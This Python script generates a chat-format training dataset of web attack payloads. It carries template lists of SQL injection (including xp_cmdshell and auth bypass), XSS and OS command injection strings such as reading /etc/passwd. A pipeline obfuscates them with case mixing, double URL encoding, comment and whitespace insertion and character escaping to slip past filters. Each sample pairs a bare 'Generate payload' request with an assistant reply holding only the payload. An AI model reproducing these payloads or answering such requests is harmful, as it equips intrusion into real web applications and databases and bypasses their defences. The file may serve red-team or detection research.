
import json
import os
import sys
import random
import urllib.parse
from collections import defaultdict
from datetime import datetime
import argparse

# Add project root to path for imports
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# --- Mes.log function ---
def log_message(cmd, status, output_file=""):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    log_entry = f"{timestamp} CMD=\"{cmd}\" STATUS={status}"
    if output_file:
        log_entry += f" OUTPUT=\"{output_file}\""
    with open("mes.log", "a", encoding="utf-8") as f:
        f.write(log_entry + "\n")

# --- Augmentation Functions ---
def random_case(text: str) -> str:
    return "".join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in text)

def double_url_encode(text: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(text))

def char_encode(text: str, encoding_type: str = 'html_entity') -> str:
    encoded_text = ""
    for char in text:
        if char in ['<', '>', "'", '"', '&', '/']: # Only encode problematic chars
            if encoding_type == 'html_entity':
                encoded_text += f"&#x{ord(char):x};"
            elif encoding_type == 'js_escape':
                encoded_text += f"\\u{ord(char):04x}"
            elif encoding_type == 'url_hex':
                encoded_text += f"%{ord(char):X}"
            else:
                encoded_text += char
        else:
            encoded_text += char
    return encoded_text

def add_sql_comments(payload: str) -> str:
    comments = ["/**/", "/*!50000*/", "-- ", "#", " ", "\t", "\n"]
    parts = payload.split(" ")
    if len(parts) > 1:
        insert_pos = random.randint(1, len(parts) - 1)
        parts.insert(insert_pos, random.choice(comments))
    return " ".join(parts)

def add_whitespace(payload: str) -> str:
    whitespace_chars = [" ", "\t", "\n", "+"]
    for _ in range(random.randint(1, 3)):
        idx = random.randint(0, len(payload))
        payload = payload[:idx] + random.choice(whitespace_chars) + payload[idx:]
    return payload

# --- Payload Templates ---
SQLI_TEMPLATES = [
    {"payload": "' OR 1=1--", "technique": "Boolean-based OR 1=1"},
    {"payload": "') OR '1'='1--", "technique": "Boolean-based OR 1=1 (parentheses)"},
    {"payload": "' UNION SELECT null,null--", "technique": "Union-based simple"},
    {"payload": "')) UNION SELECT 1,2,3--", "technique": "Union-based complex"},
    {"payload": "' AND SLEEP(5)--", "technique": "Time-based AND SLEEP"},
    {"payload": "' OR SLEEP(5)--", "technique": "Time-based OR SLEEP"},
    {"payload": "')) OR IF(1=1,SLEEP(5),0)--", "technique": "Time-based IF SLEEP"},
    {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x5c,USER()))--", "technique": "Error-based EXTRACTVALUE"},
    {"payload": "' AND UPDATE_XML(null,CONCAT(0x5c,VERSION()),null)--", "technique": "Error-based UPDATE_XML"},
    {"payload": "'; EXEC xp_cmdshell('dir');--", "technique": "Stacked Query xp_cmdshell"},
    {"payload": "admin'--", "technique": "Auth Bypass Comment"},
]

XSS_TEMPLATES = [
    {"payload": "<img src=x onerror=alert(1)>", "technique": "XSS Image onerror"},
    {"payload": "<svg/onload=alert(1)>", "technique": "XSS SVG onload"},
    {"payload": "<iframe src=javascript:alert(1)>", "technique": "XSS Iframe javascript scheme"},
    {"payload": "<body onload=alert(1)>", "technique": "XSS Body onload"},
    {"payload": "<input onfocus=alert(1) autofocus>", "technique": "XSS Input onfocus"},
    {"payload": "'; alert(document.domain);//", "technique": "XSS Script context escape"},
    {"payload": "<a href=\"javascript:alert(1)\">ClickMe</a>", "technique": "XSS Anchor javascript scheme"},
]

OS_INJECTION_TEMPLATES = [
    {"payload": "; ls -la", "technique": "OS Command ls"},
    {"payload": "; cat /etc/passwd", "technique": "OS Command cat"},
    {"payload": "& whoami", "technique": "OS Command whoami"},
    {"payload": "| id", "technique": "OS Command id"},
    {"payload": "; ping -c 1 127.0.0.1", "technique": "OS Command ping"},
]

ALL_TEMPLATES = {
    "SQLI": SQLI_TEMPLATES,
    "XSS": XSS_TEMPLATES,
    "OS_INJECTION": OS_INJECTION_TEMPLATES
}

def apply_obfuscation_pipeline(payload: str, technique_name: str) -> (str, str):
    augmentation_notes = []
    
    # 1. Random Case
    if random.random() < 0.5: # 50% chance
        payload = random_case(payload)
        augmentation_notes.append("random_case")
    
    # 2. URL Encode (1x or 2x)
    url_encode_level = random.choices([0, 1, 2], weights=[0.2, 0.5, 0.3], k=1)[0]
    if url_encode_level == 1:
        payload = urllib.parse.quote(payload)
        augmentation_notes.append("url_encode_1x")
    elif url_encode_level == 2:
        payload = double_url_encode(payload)
        augmentation_notes.append("url_encode_2x")

    # 3. Add SQL Comments (for SQLI only)
    if "SQLI" in technique_name and random.random() < 0.3: # 30% chance
        payload = add_sql_comments(payload)
        augmentation_notes.append("sql_comments")

    # 4. Add Whitespace
    if random.random() < 0.4: # 40% chance
        payload = add_whitespace(payload)
        augmentation_notes.append("add_whitespace")
    
    # 5. Char Encoding (HTML Entity, JS Escape, URL Hex)
    if random.random() < 0.2: # 20% chance
        encoding_type = random.choice(['html_entity', 'js_escape', 'url_hex'])
        payload = char_encode(payload, encoding_type)
        augmentation_notes.append(f"char_encode_{encoding_type}")

    return payload, "+".join(augmentation_notes) if augmentation_notes else "base_obfuscation"


def main():
    parser = argparse.ArgumentParser(description="Enrich RED Phase 1 dataset by generating new payloads.")
    parser.add_argument("--input_file", type=str, default="data/processed/red_v40_balanced_final_v13.jsonl",
                        help="Path to the original RED Phase 1 dataset (JSONL format).")
    parser.add_argument("--output_file", type=str, default="data/processed/red_phase1_enriched_v2.jsonl",
                        help="Path to save the enriched dataset.")
    parser.add_argument("--min_samples_per_technique", type=int, default=100,
                        help="Minimum target samples for each technique.")
    parser.add_argument("--target_total_samples", type=int, default=50000,
                        help="Target total number of samples for the enriched dataset.")
    args = parser.parse_args()

    cmd_str = f"python scripts/red_phase1_enrich_dataset.py --input_file {args.input_file} --output_file {args.output_file} --min_samples_per_technique {args.min_samples_per_technique} --target_total_samples {args.target_total_samples}"

    try:
        # 1. Load original dataset and analyze distribution
        original_dataset = []
        technique_counts = defaultdict(int)
        attack_type_technique_map = defaultdict(lambda: defaultdict(int))

        print(f"Loading original dataset from {args.input_file}...")
        with open(args.input_file, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    sample = json.loads(line.strip())
                    original_dataset.append(sample)
                    tech_key = (sample.get("attack_type", "UNKNOWN"), sample.get("technique", "UNKNOWN"))
                    technique_counts[tech_key] += 1
                    attack_type_technique_map[tech_key[0]][tech_key[1]] += 1
                except json.JSONDecodeError as e:
                    print(f"Skipping malformed JSON in input file: {e}")
        
        print(f"Original dataset size: {len(original_dataset)} samples.")
        enriched_dataset = list(original_dataset) # Start with all original samples

        # 2. Identify techniques needing augmentation
        techniques_to_augment = []
        for tech_key, count in technique_counts.items():
            if count < args.min_samples_per_technique:
                techniques_to_augment.append(tech_key)
        
        print(f"Techniques needing augmentation to {args.min_samples_per_technique} samples: {len(techniques_to_augment)}")

        # 3. Augment existing samples for underrepresented techniques
        augmentation_rounds = 0
        current_dataset_size = len(enriched_dataset)
        
        while current_dataset_size < args.target_total_samples and \
              (techniques_to_augment or current_dataset_size < len(ALL_TEMPLATES) * args.min_samples_per_technique * 2): # Ensure some new templates are always added
            
            # Prioritize augmenting existing underrepresented techniques
            if techniques_to_augment:
                target_tech_key = random.choice(techniques_to_augment)
                attack_type, technique_name = target_tech_key
                
                # Find an original payload with this technique to augment
                eligible_samples = [s for s in original_dataset if s.get("attack_type") == attack_type and s.get("technique") == technique_name]
                if eligible_samples:
                    original_sample = random.choice(eligible_samples)
                    
                    # Handle different dataset formats
                    if "messages" in original_sample:
                        original_payload = original_sample["messages"][1]["content"]
                    elif "payload" in original_sample:
                        original_payload = original_sample["payload"]
                    else:
                        # Skip if payload cannot be found
                        continue
                    
                    new_payload, augmentation_note = apply_obfuscation_pipeline(original_payload, technique_name)
                    
                    new_sample = original_sample.copy()
                    # Ensure new sample has messages format
                    new_sample["messages"] = [{"role": "user", "content": f"Generate payload for {attack_type} using {technique_name} with {augmentation_note}"},
                                              {"role": "assistant", "content": new_payload}]
                    
                    new_sample["source"] = "augmented_existing_payload"
                    new_sample["augmentation"] = augmentation_note
                    new_sample["variant_of"] = original_sample.get("original_id", "N/A") # Add original_id to original_sample if available
                    
                    enriched_dataset.append(new_sample)
                    current_dataset_size += 1
                    technique_counts[target_tech_key] += 1
                    
                    # If this technique now meets the min threshold, remove it from techniques_to_augment
                    if technique_counts[target_tech_key] >= args.min_samples_per_technique:
                        techniques_to_augment.remove(target_tech_key)
                        # print(f"  Technique {target_tech_key} met min_samples.")
                else:
                    # If no eligible samples found, remove from list to avoid infinite loop
                    techniques_to_augment.remove(target_tech_key)
            
            # Also add samples from new templates to ensure diversity
            if current_dataset_size < args.target_total_samples:
                attack_type = random.choice(list(ALL_TEMPLATES.keys()))
                template_info = random.choice(ALL_TEMPLATES[attack_type])
                base_payload = template_info["payload"]
                base_technique = template_info["technique"]
                
                new_payload, augmentation_note = apply_obfuscation_pipeline(base_payload, base_technique)
                
                new_sample = {
                    "attack_type": attack_type,
                    "technique": base_technique,
                    "source": "generated_from_template",
                    "augmentation": augmentation_note,
                    "messages": [{"role": "user", "content": f"Generate payload for {attack_type} using {base_technique} with {augmentation_note}"},
                                  {"role": "assistant", "content": new_payload}]
                }
                enriched_dataset.append(new_sample)
                current_dataset_size += 1
                technique_counts[(attack_type, base_technique)] += 1 # Update count for new techniques
            
            augmentation_rounds += 1
            if augmentation_rounds % 1000 == 0:
                print(f"  Current dataset size: {current_dataset_size} (target {args.target_total_samples}). Remaining techniques to augment: {len(techniques_to_augment)}")

        # 4. Save the enriched dataset
        os.makedirs(os.path.dirname(args.output_file), exist_ok=True)
        with open(args.output_file, 'w', encoding='utf-8') as f_out:
            for sample in enriched_dataset:
                f_out.write(json.dumps(sample) + "\n")
        
        print(f"\nEnriched dataset saved to {args.output_file} with {len(enriched_dataset)} samples.")
        log_message(cmd_str, "OK", args.output_file)

    except Exception as e:
        print(f"Error running enrichment: {e}", file=sys.stderr)
        log_message(cmd_str, "FAIL", str(e))

if __name__ == "__main__":
    main()
